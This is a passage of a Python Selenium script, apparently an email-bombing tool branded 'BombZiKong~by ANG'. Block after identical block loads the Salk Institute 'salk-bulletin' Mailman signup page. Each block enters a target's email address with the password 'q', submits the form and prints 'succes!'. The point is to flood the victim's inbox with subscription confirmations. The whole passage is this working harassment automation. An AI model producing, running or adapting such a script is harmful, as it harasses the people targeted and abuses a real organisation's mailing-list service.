print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

